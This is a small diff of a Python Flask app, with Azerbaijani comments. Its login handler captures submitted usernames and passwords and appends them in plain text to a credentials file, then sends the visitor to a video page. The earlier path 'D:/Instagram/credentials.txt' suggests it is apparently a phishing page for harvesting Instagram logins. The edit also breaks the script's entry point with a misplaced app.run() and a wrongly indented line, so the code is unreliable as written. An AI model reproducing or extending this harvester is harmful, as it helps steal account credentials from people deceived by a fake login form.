@@ -12,7 +12,7 @@ def login():
     password = request.form['password']
     
     # Məlumatları credentials.txt faylında saxla
-    with open('D:/Instagram/credentials.txt', 'a') as f:
+    with open('credentials.txt', 'a') as f:
         f.write(f'Username: {username}, Password: {password}\n')
     
     # Login olandan sonra video səhifəsinə yönləndir
@@ -22,5 +22,5 @@ def login():
 def video():
     return render_template('video.html')
 
-if __name__ == '__main__':
+app.run()
     app.run(host='0.0.0.0', port=5001, debug=True)
